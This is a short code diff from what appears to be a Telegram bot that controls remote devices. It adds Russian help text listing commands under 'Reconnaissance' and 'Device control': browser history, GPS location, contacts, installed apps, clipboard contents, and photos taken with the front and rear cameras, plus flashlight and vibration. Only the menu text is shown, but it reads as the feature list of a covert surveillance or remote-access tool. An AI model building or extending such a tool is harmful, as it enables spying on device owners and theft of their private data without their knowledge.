@@ -699,7 +699,17 @@ async def process_update(update: dict):
             "/stream\\_stop — остановить трансляцию\n\n"
             "*Разведка:*\n"
             "/history — история браузеров за 7 дней\n"
-            "/history <дней> — за указанное кол-во дней"
+            "/history <дней> — за указанное кол-во дней\n"
+            "/location — GPS координаты\n"
+            "/contacts — список контактов\n"
+            "/apps — установленные приложения\n"
+            "/clipboard — буфер обмена\n\n"
+            "*Управление устройством:*\n"
+            "/brightness <0-100> — яркость\n"
+            "/vibrate — вибрация\n"
+            "/flashon /flashoff — фонарик\n"
+            "/photo — фото основной камерой\n"
+            "/photof — фото фронтальной камерой"
         ), reply_markup=main_keyboard())
 
     elif text == "/devices":
